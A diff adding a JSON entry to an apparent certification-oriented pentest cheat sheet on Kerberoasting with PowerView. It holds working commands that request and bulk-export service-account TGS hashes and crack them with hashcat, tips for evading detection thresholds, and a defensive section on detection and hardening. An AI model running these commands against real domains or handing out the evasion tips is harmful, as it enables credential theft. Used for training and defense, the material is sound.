@@ -1,0 +1,88 @@
+{
+  "id": "ad-powerview-spnticket",
+  "name": "PowerView - Get SPN Ticket (Hashcat)",
+  "command": "Get-DomainUser -Identity <user> | Get-DomainSPNTicket -Format Hashcat",
+  "description": "Requests and formats a TGS ticket for an SPN account directly with PowerView, outputting in hashcat-ready format. Pipe all SPN users through Get-DomainSPNTicket and Export-Csv to roast the whole domain to a spreadsheet.",
+  "platform": "windows",
+  "type": "command",
+  "opsec": "loud",
+  "category": "Password Attacks",
+  "subcategory": "Kerberoasting",
+  "certifications": [
+    "CPTS",
+    "OSCP",
+    "CRTP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 13: Active Directory Enumeration & Attacks",
+  "tags": [
+    "kerberoasting",
+    "hash-capture",
+    "powerview",
+    "windows",
+    "tgs"
+  ],
+  "mitre": [
+    "T1558.003"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== POWERVIEW vs RUBEUS FOR KERBEROASTING ===\nGet-DomainSPNTicket is PowerView's built-in Kerberoast function.\nRubeus is generally preferred because:\n  - Rubeus has more options (/rc4opsec, /stats, /delay, /ldapfilter)\n  - Rubeus output is immediately Hashcat-compatible with /nowrap\n  - Rubeus is actively maintained\n\nPowerView's Get-DomainSPNTicket is useful when:\n  - You only have PowerView available (no Rubeus binary)\n  - You want to enumerate AND roast in the same pipeline\n  - You want CSV export for organized review\n\n=== PIPELINE PATTERNS ===\nSingle user:\n  Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat\n\nAll SPN users (bulk roast):\n  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat\n\nBulk + CSV export:\n  Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat |\n    Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation\n\n=== WHAT TO LOOK FOR IN CSV OUTPUT ===\nColumns: SamAccountName, DistinguishedName, ServicePrincipalName, Hash\nThe Hash column contains $krb5tgs$ format — extract to separate file for hashcat.\nSort by DistinguishedName to identify admin-tier accounts quickly.\n\n=== EXTRACT HASHES FROM CSV ===\n  Import-Csv .\\ilfreight_tgs.csv | Select-Object -ExpandProperty Hash | Out-File hashes.txt\nThen transfer to Linux: hashcat -m 13100 hashes.txt rockyou.txt",
+  "examples": [
+    {
+      "label": "Roast single user",
+      "command": "Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat"
+    },
+    {
+      "label": "Roast all SPN accounts to CSV",
+      "command": "Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\\ilfreight_tgs.csv -NoTypeInformation"
+    },
+    {
+      "label": "Extract hashes from CSV for Hashcat",
+      "command": "Import-Csv .\\ilfreight_tgs.csv | Select-Object -ExpandProperty Hash | Out-File hashes.txt"
+    }
+  ],
+  "references": [
+    {
+      "title": "PowerView (PowerSploit)",
+      "url": "https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1"
+    },
+    {
+      "title": "PowerSploit Recon docs",
+      "url": "https://powersploit.readthedocs.io/en/latest/Recon/"
+    },
+    {
+      "title": "HTB Academy - Active Directory Enumeration & Attacks",
+      "url": "https://academy.hackthebox.com/module/details/143"
+    },
+    {
+      "title": "OffSec PEN-200 (OSCP)",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-kerberoast-crack",
+      "rel": "next",
+      "note": "Crack the roasted hashes."
+    }
+  ],
+  "defense": {
+    "why_it_works": "PowerView Get-DomainSPNTicket (or Invoke-Kerberoast) requests a TGS for an SPN account and outputs the crackable hash.",
+    "prerequisites": "Valid domain credentials and PowerView in the session.",
+    "impact": "A crackable TGS hash for the targeted service account.",
+    "detection": "[MITRE T1558.003] Event 4769 (TGS requested) with RC4 encryption type (0x17) when AES is standard, or a burst of TGS requests for many SPNs from one source in a short window; a request for a honeypot SPN account is malicious by definition.",
+    "artifacts": "A 4769 TGS request; the extracted hash; PowerView in 4104 logs.",
+    "prevention": "Use 100+ character passwords or gMSA for service accounts; disable RC4 (force AES); audit and remove unused SPNs; deploy honeypot SPN accounts to catch roasting; Defender for Identity flags mass TGS requests.",
+    "evasion": "Rubeus can force an RC4 downgrade (/rc4opsec, /tgtdeleg) to obtain crackable tickets even where AES is preferred; request one SPN at a time to stay under the bulk-4769 threshold.",
+    "sources": [
+      "HTB M13",
+      "MITRE T1558.003"
+    ],
+    "misconfiguration": "Service accounts are registered with a Service Principal Name (SPN) but use weak, human-chosen passwords — or even share a password with other accounts. Any authenticated domain user can request a TGS for any SPN account, receiving a blob encrypted with that account's NTLM hash. The SPN registration itself is not the flaw; the flaw is weak passwords on SPN accounts and permitting RC4 encryption (which produces a shorter, faster-to-crack blob).",
+    "vulnerable_config": "# Service account set up manually with a weak password + SPN\n# Attacker can find these with:\nGet-ADUser -Filter {ServicePrincipalName -ne '$null'} -Properties ServicePrincipalName,PasswordLastSet\n\n# Bad state — password set 4 years ago, RC4 permitted:\n# Name: svc_sql  PasswordLastSet: 2020-01-15  SPN: MSSQLSvc/db01.corp.local:1433\n# RC4 (0x17) requested in TGS ticket — short hash, GPU-crackable\n\n# Confirming RC4 is available:\nGet-ADUser svc_sql -Properties msDS-SupportedEncryptionTypes\n# msDS-SupportedEncryptionTypes: 0 (= RC4+AES both permitted if 0 or blank)",
+    "secure_config": "# Fix 1 — Use Group Managed Service Accounts (gMSA): 240-char random passwords,\n# auto-rotated by AD, no human ever knows the password\nNew-ADServiceAccount -Name gmsa_sql -DNSHostName sql.corp.local \\\n    -PrincipalsAllowedToRetrieveManagedPassword 'db-servers-grp'\nInstall-ADServiceAccount gmsa_sql\n\n# Fix 2 — For legacy accounts that must keep SPNs:\n# Set a 100+ character random password (AD max is 127 chars):\n$pw = [System.Web.Security.Membership]::GeneratePassword(127,20)\nSet-ADAccountPassword svc_sql -NewPassword (ConvertTo-SecureString $pw -AsPlainText -Force)\n\n# Fix 3 — Disable RC4, require AES-only:\nSet-ADUser svc_sql -KerberosEncryptionType AES128,AES256\n# msDS-SupportedEncryptionTypes = 24 (AES128+AES256 only)"
+  },
+  "tools": [
+    "PowerView"
+  ]
+}
